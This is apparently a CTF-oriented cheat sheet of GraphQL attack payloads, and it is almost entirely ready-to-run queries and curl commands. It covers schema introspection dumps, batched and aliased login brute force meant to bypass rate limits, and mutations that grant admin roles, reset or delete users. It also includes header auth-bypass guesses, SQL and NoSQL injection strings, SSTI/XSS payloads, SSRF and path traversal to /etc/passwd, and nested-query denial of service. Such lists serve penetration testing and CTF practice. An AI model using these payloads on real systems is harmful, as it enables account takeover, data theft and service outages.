# GraphQL

## Try

```graphql
{__typename}
query{__schema{types{name}}}
query{__schema{queryType{name} mutationType{name}}}
query IntrospectionQuery{__schema{queryType{name}}}
```

Endpoint probes:

```bash
for p in /graphql /api/graphql /v1/graphql /gql /query /graphiql /playground /console; do
  curl -s -i "http://HOST$p?query={__typename}" | head -20
done
```

## Introspection

```graphql
query IntrospectionQuery {
  __schema {
    types {
      name
      kind
      fields {
        name
        args { name type { name kind ofType { name kind } } }
        type { name kind ofType { name kind } }
      }
    }
  }
}
```

```bash
curl -s http://HOST/graphql \
  -H 'content-type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'
```

If introspection is blocked, use field suggestions:

```graphql
query{user{id username password}}
query{me{id username email role isAdmin flag}}
query{users{id username email role isAdmin}}
query{node(id:"1"){id}}
query{flag}
```

Common error-driven guesses:

```text
Cannot query field "password" on type "User". Did you mean "pass"?
Unknown argument "id" on field "user". Did you mean "userId"?
Field "user" argument "id" of type "ID!" is required.
```

Schema dump with aliases:

```graphql
query{
  q:__schema{queryType{fields{name args{name type{name kind ofType{name kind}}}}}}
  m:__schema{mutationType{fields{name args{name type{name kind ofType{name kind}}}}}}
  t:__schema{types{name kind fields{name args{name type{name kind ofType{name kind}}} type{name kind ofType{name kind}}}}}
}
```

## Common Reads

```graphql
query{users{id username role}}
query{user(id:1){id username role}}
query{me{id username role}}
query{notes{id title body author{id username}}}
query{flag}
query{admin{id username role}}
query{viewer{id username email role isAdmin}}
query{posts{edges{node{id title body author{id username}}}}}
query{allUsers{id username email password resetToken otp secret}}
query{settings{name value}}
query{config{key value}}
query{debug}
```

## Batching

```json
[
  {"query":"query{me{id username}}"},
  {"query":"query{flag}"},
  {"query":"query{user(id:1){id username role}}"}
]
```

Brute force in one HTTP request:

```json
[
  {"query":"mutation{login(username:\"admin\",password:\"0000\"){token}}"},
  {"query":"mutation{login(username:\"admin\",password:\"0001\"){token}}"},
  {"query":"mutation{login(username:\"admin\",password:\"0002\"){token}}"}
]
```

## Aliases

```graphql
query {
  a:user(id:1){id username}
  b:user(id:2){id username}
  c:user(id:3){id username}
}
```

Alias brute force / rate-limit bypass:

```graphql
mutation {
  p0000:login(username:"admin",password:"0000"){token}
  p0001:login(username:"admin",password:"0001"){token}
  p0002:login(username:"admin",password:"0002"){token}
  p0003:login(username:"admin",password:"0003"){token}
}
```

Alias many IDs:

```graphql
query {
  u1:user(id:1){id username email role}
  u2:user(id:2){id username email role}
  u3:user(id:3){id username email role}
  n1:node(id:"VXNlcjox"){id ... on User{username role}}
}
```

## Mutation

```graphql
mutation{updateUser(id:1,role:"admin"){id username role}}
mutation{createNote(title:"x",body:"{{7*7}}"){id}}
mutation{login(username:"admin",password:"x"){token}}
mutation{register(username:"x",password:"x",role:"admin"){id username role}}
mutation{resetPassword(userId:1,password:"pwned"){id username}}
mutation{deleteUser(id:2){ok}}
mutation{createInvite(role:"admin"){code}}
mutation{updateProfile(id:1,input:{role:"admin",isAdmin:true}){id role isAdmin}}
```

Variables:

```json
{
  "query": "mutation($id:ID!,$input:UserInput!){updateProfile(id:$id,input:$input){id role isAdmin}}",
  "variables": {"id":"1","input":{"role":"admin","isAdmin":true}}
}
```

Operation-name confusion:

```json
{
  "operationName":"safe",
  "query":"query safe{me{id}} mutation evil{updateUser(id:1,role:\"admin\"){id role}}"
}
```

## Global ID

```python
import base64

for x in ["User:1", "User:2", "Note:1", "Flag:1", "Admin:1", "Post:1"]:
    print(x, base64.b64encode(x.encode()).decode())
```

```graphql
query{node(id:"VXNlcjox"){id ... on User{username role}}}
query{nodes(ids:["VXNlcjox","VXNlcjoy"]){id ... on User{username email role}}}
```

## Header / Method

```bash
curl http://HOST/graphql?query='{me{id}}'
curl -X POST http://HOST/graphql -H 'content-type: application/json' -d '{"query":"{me{id}}"}'
curl -X POST http://HOST/graphql -H 'content-type: application/graphql' --data '{me{id}}'
curl http://HOST/graphql -H 'Authorization: Bearer TOKEN' -H 'X-User-Id: 1'
curl -X GET 'http://HOST/graphql?query=mutation%7BupdateUser(id:1,role:%22admin%22)%7Bid%7D%7D'
curl -X POST http://HOST/graphql -H 'content-type: application/x-www-form-urlencoded' --data-urlencode 'query={me{id}}'
```

Header auth bypass guesses:

```bash
curl http://HOST/graphql -H 'X-User-Id: 1' -H 'X-Role: admin' -d '{"query":"{me{id role}}"}'
curl http://HOST/graphql -H 'X-Original-URL: /admin/graphql' -d '{"query":"{flag}"}'
curl http://HOST/graphql -H 'X-Forwarded-For: 127.0.0.1' -d '{"query":"{flag}"}'
```

## Directives / Fragments

```graphql
query($show:Boolean!){
  me{
    id
    email @include(if:$show)
    password @skip(if:false)
  }
}
```

```graphql
query{
  me{
    ...userFields
    ... on Admin{flag secret}
  }
}
fragment userFields on User{id username email role}
```

Union/interface discovery:

```graphql
query{
  search(q:"a"){
    __typename
    ... on User{id username email}
    ... on Post{id title body}
    ... on Flag{flag}
  }
}
```

## Injection Through Resolvers

SQLi:

```graphql
query{user(id:"1'"){id username}}
query{user(id:"1 OR 1=1"){id username email}}
query{search(q:"x%' OR '1'='1"){id title}}
query{user(name:"admin';SELECT pg_sleep(5)--"){id}}
```

NoSQL:

```graphql
query{login(username:"admin",password:{"$ne":null}){token}}
query{users(filter:"{\"role\":{\"$ne\":\"user\"}}"){id username role}}
query{users(search:"{\"username\":{\"$regex\":\"^admin\"}}"){id username}}
```

SSTI/XSS sink through mutation:

```graphql
mutation{createNote(title:"{{7*7}}",body:"<img src=x onerror=alert(1)>"){id}}
mutation{updateProfile(displayName:"{{config}}"){id displayName}}
```

SSRF/file/path sink guesses:

```graphql
mutation{importAvatar(url:"http://127.0.0.1:8000/admin"){ok}}
mutation{importAvatar(url:"file:///etc/passwd"){ok}}
query{readFile(path:"/flag.txt")}
query{download(filename:"../../../../etc/passwd")}
```

## DoS / Cost Probe

Use carefully in CTFs to identify missing depth/cost limits.

```graphql
query{
  me{
    posts{
      author{
        posts{
          author{
            posts{id}
          }
        }
      }
    }
  }
}
```

Alias overloading:

```graphql
query{
  a:expensiveField
  b:expensiveField
  c:expensiveField
}
```

## Tools

GraphQL Cop: https://github.com/dolevf/graphql-cop

```bash
git clone https://github.com/dolevf/graphql-cop
cd graphql-cop
python3 -m pip install -r requirements.txt
python3 graphql-cop.py -t http://HOST/graphql
python3 graphql-cop.py -t http://HOST/graphql -H '{"Authorization":"Bearer TOKEN"}'
graphql-cop -t http://HOST/graphql
```

GraphQLmap: https://github.com/swisskyrepo/GraphQLmap

```bash
python3 -m pip install graphqlmap
graphqlmap -u http://HOST/graphql -method POST
graphqlmap -u http://HOST/graphql -method POST --headers '{"Authorization":"Bearer TOKEN"}'
```

## References

* [PortSwigger Web Security Academy: GraphQL API vulnerabilities](https://portswigger.net/web-security/graphql)
* [PayloadsAllTheThings: GraphQL Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/GraphQL%20Injection/)
* [HackTricks: GraphQL](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html)
